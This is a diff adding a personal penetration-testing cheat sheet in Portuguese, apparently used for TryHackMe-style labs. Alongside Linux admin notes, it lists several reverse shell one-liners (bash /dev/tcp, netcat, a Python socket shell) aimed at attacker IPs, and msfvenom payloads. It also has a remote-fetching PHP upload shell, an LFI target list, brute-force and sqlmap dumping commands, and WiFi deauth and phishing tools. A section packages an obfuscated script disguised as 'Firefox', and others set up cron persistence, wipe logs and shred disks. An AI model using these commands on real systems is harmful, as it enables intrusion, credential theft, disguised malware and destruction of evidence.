@@ -1,0 +1,435 @@
+alias wifipump='sudo docker run --privileged -ti --rm --name wifipumpkin3 --net host "wifipumpkin3" '
+alias tryhackme='sudo openvpn ~/Documentos/OVPN/Maarckz.ovpn'
+alias chromium='chromium --proxy-server=http://127.0.0.1:8080'
+alias wpscan='sudo docker run -it --rm -v ~/Documentos/Wordlists:/wordlists wpscanteam/wpscan'
+
+
+
+#ROOMS_CLEAR ****************************************************************************************************************************************
+MR Robot   //    RootMe    //    Pickle Rick   //    Bounty Hacker   //    TheMarketPlace    //    BasicPentester    //     GitHappiness     //     AllinOne    //    Madness
+AgentSudo  //    Overpass  //    LazyAdmin     //    WonderLand      //    Vulniversity      //    BruteIt           //     Cyborg           //     ToolRus     //    CaptureTheFl4g
+
+4064004f-9d42-41fb-ba4e-df5a5c7fb4e1
+
+gsettings set org.gnome.desktop.interface scaling-factor 2
+fstab (iniciar o linux com Dispositivo montado)
+
+grep -v -E 'Size: (6715|6716|6717|6718)'
+
+dmesg  <<-- Log do Kernel
+seq 1 500 
+
+EXPULSAR ATACANTE REMOTO==============================================================================================================
+sudo ss -tulnp
+sudo iptables -A INPUT -s <IPALVO> -j DROP
+who -u
+sudo kill -9 PID
+
+echo "Maarckz" > /root/king.txt
+chattr -i /root/king.txt
+
+
+LFI==================================================================================================================================
+.php?<parametro>=../../
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/self/environ
+/proc/version
+/proc/cmdline
+
+
+sudo python Responder.py -I tun0      <<--  Serve para usar o SMB para cuspir hash das credenciais do usuáriro
+sudo evil-winrm -i 10.129.95.234 -u administrator -p badminton   <<--   https://techyrick.com/evil-winrm-full-tutorial/
+
+MOVIMENTACAO_TERMINAL=============================================================================================================
+Ctrl + Z
+fg <numero da tarefa>
+
+
+REDIRECIONAR_TO_VPN=================================================================================================================
+sudo iptables -t nat -A OUTPUT -o tun0 -j DNAT --to-destination 10.13.5.224
+
+
+PRIVILEGE_ESCALATION=================================================================================================================
+bash -i >& /dev/tcp/127.0.0.1/9999 0>&1        << -- Movimento lateral
+bash -i >& /dev/tcp/10.6.87.101/5555 0>&1
+
+
+VENV_PYTHON=========================================================================================================================
+mkdir novo_projeto
+cd novo_projeto/
+** python2.7 -m virtualenv nome_do_ambiente_virtual
+** python3 -m venv nome_do_ambiente_virtual
+source nome_do_ambiente_virtual/bin/activate
+|____Replicando ambientes
+|____pip freeze > requirements.txt (será criado um arquivo com todas as bibliotecas do venv)
+|____pip install -r requirements.txt  (para instalar)
+source nome_do_ambiente_virtual/bin/deactivate
+rm -rf nome_do_ambiente_virtual
+
+
+GERAR_WORDLIST=======================================================================================================================
+cewl -d 2 -m 5 -w passwords.txt http://10.10.145.228 --with-numbers
+cewl -d 0 -m 5 -w usernames.txt http://MACHINE_IP/team.php --lowercase
+crunch 3 3 0123456789ABCDEF -o 3digits.txt
+
+
+#PYTHON=============================================================================================================================
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+wget http://10.13.5.224:8000/linpeas.sh
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.5.224",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=os.system("/bin/sh -i")'
+export TERM=xterm
+
+
+MALWARE============================================================================================================================
+pyarmor -q gen gunkey.py
+pyinstaller -n Firefox -F gunkey.py
+pyarmor gen -O obfdist --pack dist/Firefox gunkey.py
+
+
+ZIPAR===============================================================================================================================
+zip -r gunkey.zip gunkey.py
+
+
+CAPTIVE_FILES========================================================================================================================
+getcap -r / 2>/dev/null
+
+
+WEB_ENUMERATION====================================================================================================================
+/robots.txt
+<source-code>
+
+
+LINUX_ENUMERATION===================================================================================================================
+apropos ''  <<-- Lista todos os comandos disponiveis
+env  <<-- Verifica as variáveis de ambiente
+hostname
+/proc/version
+/etc/issue
+ps axjf  <<-- Processos em Execução
+systemctl --type=service --state=active  <<-- Serviços em Execução
+uname -a
+id
+ip a
+netstat -ano
+netstat -nr
+/etc/passwd
+/etc/shadow
+grep -R "THM" /
+grep . -rnw -e 'texto que você quer encontrar'
+grep -iRl 'texto que você quer encontrar' /
+grep <texto> access.log | cut -d '  '
+cut -d ' ' -f3 acess.log | cut -d ':' -f1 | sort
+awk '{print $3}' arquivo1.txt  <<-- Filtrar colunas
+cat syslog | grep ci-info
+
+
+BACKUP_DO_SISTEMA==================================================================================================================
+********PARA FAZER BKP	
+	sudo tar -cvpzf /media/sh1n003/Maarckz/backup.tar.gz --one-file-system /
+********PARA RESTAURAR O BKP (Boot em USB Live)
+	sudo tar -xvpzf /media/sh1n003/Maarckz/backup.tar.gz -C /
+	
+
+BAIXAR_SITE_POR_COMPLETO===========================================================================================================
+wget --mirror --convert-links --adjust-extension --page-requisites https://URL
+wget --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/88.0" --mirror --convert-links --adjust-extension --page-requisites https://URL
+
+
+CONFIG-SERVICE==========================================================================================================================
+sudo netstat -tulpn
+sudo systemctl list-unit-files
+sudo systemctl disable <nome do serviço>
+sudo update-rc.d -f <nome do serviço> remove
+
+
+IP EXTERNO==========================================================================================================================
+curl ifconfig.me
+
+
+REVERSE_SHELL====================================================================================================================
+bash -i >& /dev/tcp/10.13.5.224/8080 0>&1
+nc -e /bin/sh 10.13.5.224 4545
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.5.224 1234 >/tmp/f
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f	
+nc -nlvp 4455 -e /bin/bash
+nc –nlvp 1234
+
+
+FIND_PERMISSION==================================================================================================================
+	/ - Pesquisa todo o sistema de arquivos
+	-perm - procura arquivos com permissões específicas
+	-type f - Procurar apenas ficheiros
+	2>/dev/null - Suprime erros 
+	
++
+https://cybrarist.com/tryhackme/ninja-skills-walkthrough/
++
+
+find / -type f \( -name name -o -name othername \) -exec ls -ladb {} \; 2>/dev/null
+find / -name root.txt -exec ls -lda {} \; 2>/dev/null
+find / -user root -perm -4000 -exec ls -ladb {} \; 2>/dev/null
+find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null
+find / -type f -perm -u=s -user des -ls 2>/dev/null
+find / -type f -name "*.bak" 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+find /  -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'
+
+CR[O]N============================================================================================================================
+echo "*/1 * * * * /usr/bin/python3 /home/kali/Documentos/gun.py" | crontab -
+
+ 
+NMAP==============================================================================================================================
+nmap  --system-dns 192.168.0/16  
+nmap -p- -v 127.0.0.1 -T3
+nmap -p- --min-rate 1000 -sV 10.129.128.223
+sudo ss -tulpn | grep <porta>  <<-- DESCOBRIR QUE SERVIÇO RODA 	
+sudo ss -naup
+
+
+DOCKER============================================================================================================================
+<install>
+git clone https://github.com/jaeles-project/gospider.git
+docker build -t gospider:latest gospider
+docker run -t gospider -h
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+	<remove>
+	cd gospider
+	rm -rf gospider
+	docker rmi gospider:latest
+	sudo docker stop $(sudo docker ps -aqf "ancestor=gospider:latest")
+	sudo docker rm $(sudo docker ps -aqf "ancestor=gospider:latest")
+
+
+DIRECTORY_BUSTER===================================================================================================================
+gobuster dir -u http://10.10.90.191/ -w Documentos/wordlists/dirb/directory-list-2.3-big.txt -x .php,.html,.txt -a "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 
+dirb http://www.bancocn.com -a "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" -c "cf_clearance=27c5539e3e988f2ae81efa2fb0accb3408152e2c-1621549626-0-150; PHPSESSID=2mgelk1ruab572mrra8vn015u6"
+
+
+FFUF===============================================================================================================================
+ffuf -w Documentos/wordlists/dirb/directory-list-2.3-medium.txt -u http://testphp.vulnweb.com/FUZZ    <<-- Diretório Buster
+seq 1 500 | ffuf -u http://testphp.vulnweb.com/artists.php?artist=FUZZ -w -  <<-- buscar por parametros (sql ou similar)
+ffuf -u http://testphp.vulnweb.com/login.php -X POST -d "uname=USER&pass=PASS" -w Documentos/wordlists/Discovery/Web-Content/common.txt:USER -w Documentos/wordlists/Discovery/Web-Content/common.txt:PASS -H "Content-Type: application/x-www-form-urlencoded" -fc 302
+
+
+ENUMERAR_DNS======================================================================================================================
+for palavra in $( cat {caminhowordlist.txt});do host $palavra.{nomedosite.com};done
+
+
+SQLMAP_PLUGIN=====================================================================================================================
+sqlmap -u "http://172.18.2.3/wordpress/wp-admin/admin-ajax.php" --data="action=spAjaxResults&pollid=2" --threads=10 --random-agent --dbms=mysql --batch -D Rookie -T wp_users --dump
+' o  r 1=1; --
+admin'#
+
+
+SQLMAP_TAMPER====================================================================================================================
+https://github.com/sqlmapproject/sqlmap/tree/master/tamper
+
+
+METASPLOIT_FRAMEWORK=============================================================================================================
+INICIAR o MSFCONSOLE
+sudo systemctl start postgresql
+msfdb init
+
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.13.5.224 LPORT=44 -f war > shell.war
+msfvenom -a x64 -p linux/x64/meterpreter_reverse_tcp -f elf -o shell Lhost=192.168.56.1 Lport=4455
+msfvenom -p cmd/unix/reverse_netcat lhost=10.13.5.244 lport=8888 R
+
+
+JOHN_THE_RIPPER==================================================================================================================
+reRun JOHN > delete 'john.pot'
+unshadow passwd shcat adow > passwords.txt
+john --show
+
+HYDRA============================================================================================================================
+hydra -s 80 -L Documentos/rockyou.txt -P Documentos/rockyou.txt http-post-form:"//192.168.56.102/login.php:username=^USER^&password=^PASS^:Invalid username or password."
+hydra -l bob -P Documentos/rockyou.txt 10.10.121.235 http-get "/protected"
+hydra -L -P 10.10.133.96 ssh
+hydra -s 80 -l "" -P Documentos/rockyou.txt http-post-form:"//10.10.99.47/login.phjp:password=^PASS^:Invalid credentials"
+	só para o password
+
+
+WPSCAN===========================================================================================================================
+wpscan --url http://internal.thm/blog --usernames admin --passwords ~/Documentos/rockyou.txt 
+
+
+EXPLOIT_EM_.C====================================================================================================================
+gcc exploit.c -o <nomedoarquivo>
+./<nomedoarquivo>
+
+
+KEYSENSITIVE BASH =================================================================================================================================
+echo set completion-ignore-case on | sudo tee -a /etc/inputrc
+
+
+LOGVIEW==========================================================================================================================
+Check-List:
+     O que aconteceu?
+     Quando isso aconteceu?
+     Onde aconteceu?
+     Quem fez isso? Eles tiveram sucesso?
+     Qual é o resultado dessa ação?
+     
+     
+AWK==============================================================================================================================
+awk '{print NR,$0}' file.txt
+awk '{print $1, $3}' file.txt
+cat logfile | awk '{print $1, $3}'
+awk 'BEGIN{FS=" "; OFS=":"} {print $1,$4}' awk.txt (Substituir 'espaço' por ':')
+awk  'BEGIN{ORS=", "}{print $1}' awk.txt (Coluna em linhas separado por virgula)
+
+
+PHP==============================================================================================================================   
+*File Upload  <?php file_put_contents('shell.php',file_get_contents('http://10.13.5.224/shell.php'))?>
+10.10.80.221/?view=dog/../../../../../../../var/log/apache2/access.log&ext=
+
+
+WIFI_HACKING=====================================================================================================================
+sudo airmon-ng wlan0 <channel>
+sudo iwconfig wlp4s0mon channel 1
+sudo aireplay-ng --deauth 200 -a 00:31:xx:xx:52:xx wlan0
+bettercap -T 192.168.0.100 --interface at0 --no-spoofing --no-discovery --proxy --proxy-port 80 --proxy-https --proxy-https-port 443 -P POST
+sudo wifiphisher -nD -i wlan0
+sudo wifite --bully --kill
+
+
+Mudar WIFI para wlan0================================================================================================================
+sudo ip link set wlp2s0 down
+sudo ip link set wlp2s0 name wifi0
+sudo ip link set wifi0 up
+
+
+DPKG_DEB=========================================================================================================================
+sudo dpkg -i (install)
+sudo dpkg -r (remove)
+sudo dpkg -P (Purge)
+
+
+VERIFICAR_HOST_CONEXÔES===========================================================================================================
+sudo netdiscover
+
+BOOT_GRUB=========================================================================================================================
+grub> set root=(hd0,1)     <<- sintaxe da versão Grub2
+grub> linux /boot/vmlinuz-xxxx root=/dev/sda1 ro quiet
+grub> initrd /boot/initrd.img
+grub> boot 
+CFG >>  sudo nano /etc/default/grub    ((Manual em "www.gnu.org/software/grub"))
+
+
+DHCP==============================================================================================================================
+sudo nano /etc/dhcp/dhcpd.conf
+(descomentar)
+sudo service isc-dhcp-server restart
+
+
+SMBCLIENT==========================================================================================================================
+smbclient -L 10.129.132.189  <<-- Listar compartilhamentos
+smbclient  \\\\10.129.132.189\\WorkShares   <<-- acessar via terminal caso o compartilhamento não tenha senha $
+
+SHELL_SCRIPT======================================================================================================================
+https://tryhackme.com/room/bashscripting
+scp <arquivolocal> maarckz@192.168.56.104:/home/maarckz/<nomedoarquivo>   <<-- Transferir arquivos via ssh
+scp usuário@host:diretório/ArquivoFonte ArquivoAlvo  <<-- Baixar arquivos via ssh
+sudo chown maarckz:maarckz <arquivo>
+				     |                |_ Grupo		
+ 				     |________ Usuário
+ 				     
+ 				     
+PARTIÇÕES + MONTAR NA INICIALIZAÇÃO===============================================================================================
+df -h
+umount -t ext4 /dev/sdx && mkfs.ext4 /dev/sdx 
+	dd if=/deb/sdx of=/dev/sdy bs=1M conv=noerror 
+sudo blkid 
+sudo nano /etc/fstab
+
+	
+LEGION_5==========================================================================================================================
+sudo apt install linux-oem-22.04 (fix_wifi)
+wlp4s0 (iface Wifi)
+
+
+
+https://github.com/flozz/p0wny-shell/blob/master/shell.php
+
+
+==========================================
+https://tryhackme.com/room/dreaming
+/home/death/death_flag.txt
+/home/lucien/lucien_flag.txt
+/home/morpheus/morpheus_flag.txt
+
+s sh lucien@10.10.16.87
+HeyLucien#@1999!
+
+mysql -u lucien -plucien42DBPASSWORD
+nano shutil.py 
+mv test.sh test.py
+
+
+JUMPTHECAT===============================================================================
+
+Criar PHP em imagem:
+	echo -e "\xFF\xD8\xFF\xE0" > image.php
+	echo -n '<?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>' >> image.php
+	file image.php   ( Deve retornar : image.php: JPEG image data)
+
+CONFIG_SSH=====================================================================================================
+ssh-keygen -t rsa 
+(enter passphrase)
+ssh-copy-ip <user>@<ip>
+
+teste: scp textoteste <user>@<ip>:teste
+
+/etc/ssh/sshd_config
+		Protocol 2
+		#Port 22
+		ClientAliveInterval 360
+		ClientAliveCountMax 0
+		MaxAuthTries 3
+		LoginGraceTime 20
+		PermitRootLogin no
+		PermitEmptyPasswords no
+		PermitUserEnvironment no
+		#PasswordAuthentication no
+		X11Forwarding no
+		PrintMotd no
+		Banner = /etc/issue.net
+		AllowUsers maarckz
+
+Para remover o Banner de autenticação:
+		sudo nano /etc/pam.d/sshd
+		#session    optional     pam_motd.so  motd=/run/motd.dynamic
+		sudo service ssh restart
+
+w                      |   Mostra qual usuário 
+who -u           |   está  conectado
+
+Subistituir o "OpenSSH_8.9p1" pela mesma quantidade de caracteres:
+		sudo perl -pi -e 's/OpenSSH_8.9p1/NoHaveNothing/g' /sbin/sshd
+		sudo systemctl restart sshd
+
+SITES_UTEIS=====================================================================================================
+https://explainshell.com/
+
+
+LIMPEZA_LOGS===================================================================================================
+#! /bin/sh
+cd /var/log
+for l in `ls -p|grep '/'`; do
+ echo -n >$l &>/dev/null
+ echo Zerando arquivo $l...
+done
+echo Limpeza dos arquivos de log concluída!
+
+
+UNDETECTED_FORMAT_DISK===================================================================================================
+sudo mkfs.ext4 /dev/sdX
+sudo shred -n 1 -v /dev/sdX
